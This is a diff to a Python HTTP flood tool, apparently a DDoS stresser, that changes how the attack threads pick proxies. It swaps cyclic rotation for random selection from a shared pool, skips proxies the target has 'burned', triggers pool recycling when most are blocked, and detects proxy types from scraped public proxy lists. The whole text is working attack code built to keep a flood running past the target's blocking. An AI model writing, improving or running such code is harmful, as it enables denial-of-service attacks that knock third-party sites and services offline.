@@ -947,8 +947,8 @@ class HttpFlood(Thread):
                 ",https://www.google.com/translate?u="
             ]
         self._referers = list(referers)
-        if proxies:
-            self._proxies = list(proxies)
+        if proxies is not None:
+            self._proxies = proxies # [PHASE 13] Use shared reference, don't copy!
 
         if not useragents:
             # [OPTIMIZED] Modern User-Agents (2025 Era)
@@ -1120,46 +1120,38 @@ class HttpFlood(Thread):
     def open_connection(self, host=None) -> socket:
         proxy = None
         if self._proxies:
-            # [PHASE 11] Temporal Blacklist Check
-            if not hasattr(self, '_proxy_cycle'):
-                from itertools import cycle
-                self._proxy_cycle = cycle(self._proxies)
-            
-            # Use a limited number of attempts to find a "cool" proxy
-            for _ in range(len(self._proxies)):
-                p = next(self._proxy_cycle)
+            # [PHASE 13] Dynamic Random Selection for Live Synchronization
+            # random.choice on the shared list ensures recycled proxies are used immediately
+            for _ in range(20): # Try 20 times to find a non-burned proxy
+                p = randchoice(self._proxies)
                 
                 # Check if proxy is in Cooling Period
                 burn_time = BURNED_PROXIES.get(p.proxy)
                 if burn_time:
                     if time() - burn_time > COOLING_PERIOD:
-                        # Cooling period expired, remove from blacklist
-                        del BURNED_PROXIES[p.proxy]
+                        # Cooling period expired
+                        with suppress(KeyError):
+                            del BURNED_PROXIES[p.proxy]
                     else:
-                        # Still cooling down, skip
-                        continue
+                        continue # Skip burned
                 
                 self._current_proxy = p.proxy
                 proxy = p
                 break
             
-            # [PHASE 11] Emergency Fallback: If ALL proxies are cooling, wait a bit
-            if not proxy:
-                # [PHASE 11] Trigger background recycle if pool is exhausted
+            # [PHASE 13] Trigger auto-recycle if healthy pool is low
+            # Trigger if >80% are burned
+            if len(BURNED_PROXIES) > len(self._proxies) * 0.8:
                 global RECYCLE_EVENT, IS_RECYCLING
                 if not IS_RECYCLING:
                     RECYCLE_EVENT.set()
-                
-                # print("[DEBUG] Pool Exhausted: Waiting for Cooling Period...")
-                sleep(2)
-                # Just take the first one available after sleep to avoid 0 PPS
-                proxy = next(self._proxy_cycle)
-                self._current_proxy = proxy.proxy
             
-            # [PHASE 11] Aggressive Recycle: Trigger when 80% of pool is burned
-            elif len(BURNED_PROXIES) > len(self._proxies) * 0.8:
-                if not IS_RECYCLING:
-                    RECYCLE_EVENT.set()
+            # If still no proxy (Pool exhausted), wait and retry or use current
+            if not proxy:
+                RECYCLE_EVENT.set()
+                sleep(2)
+                proxy = randchoice(self._proxies)
+                self._current_proxy = proxy.proxy
 
         sock = None
         if proxy:
@@ -1559,18 +1551,17 @@ class HttpFlood(Thread):
         # Map raw proxy to httpx format
         proxy_url = None
         if self._proxies:
-            if not hasattr(self, '_proxy_cycle'):
-                from itertools import cycle
-                self._proxy_cycle = cycle(self._proxies)
-            p = next(self._proxy_cycle)
-            # [PHASE 11] Temporal Check
-            burn_time = BURNED_PROXIES.get(p.proxy)
-            if burn_time and time() - burn_time < COOLING_PERIOD:
-                return # Still cooling
-            
-            # [PHASE 5] Smart Protocol Detection for httpx
-            prefix = "socks5://" if p.type in {ProxyType.SOCKS5, ProxyType.SOCKS4} else "http://"
-            proxy_url = f"{prefix}{p.proxy}"
+            # [PHASE 13] Use randchoice for shared pool sync
+            for _ in range(10):
+                p = randchoice(self._proxies)
+                burn_time = BURNED_PROXIES.get(p.proxy)
+                if not burn_time or (time() - burn_time >= COOLING_PERIOD):
+                    # [PHASE 5] Smart Protocol Detection for httpx
+                    prefix = "socks5://" if p.type in {ProxyType.SOCKS5, ProxyType.SOCKS4} else "http://"
+                    proxy_url = f"{prefix}{p.proxy}"
+                    break
+            else:
+                return # All burned, wait for recycle
 
         headers = {
             "User-Agent": ua,
@@ -2415,15 +2406,20 @@ def handleProxyList(con, proxy_li, proxy_ty, url=None):
         scavenged_proxies = []
         for source in sources:
             try:
-                # logger.debug(f"Fetching from: {source}") # Silent fetch to reduce spam
+                # [PHASE 13] Detect Protocol from Source URL
+                p_type = ProxyType.SOCKS5
+                if "socks4" in source.lower(): p_type = ProxyType.SOCKS4
+                elif "http" in source.lower() and "socks" not in source.lower(): p_type = ProxyType.HTTP
+                
                 with get(source, timeout=10) as r:
                     if r.status_code == 200:
                         lines = r.text.splitlines()
                         for line in lines:
+                            line = line.strip()
                             if ":" in line:
                                 try:
-                                    parts = line.strip().split(":")
-                                    scavenged_proxies.append(Proxy(parts[0], int(parts[1]), ProxyType.SOCKS5))
+                                    parts = line.split(":")
+                                    scavenged_proxies.append(Proxy(parts[0], int(parts[1]), p_type))
                                 except: pass
             except Exception:
                 continue
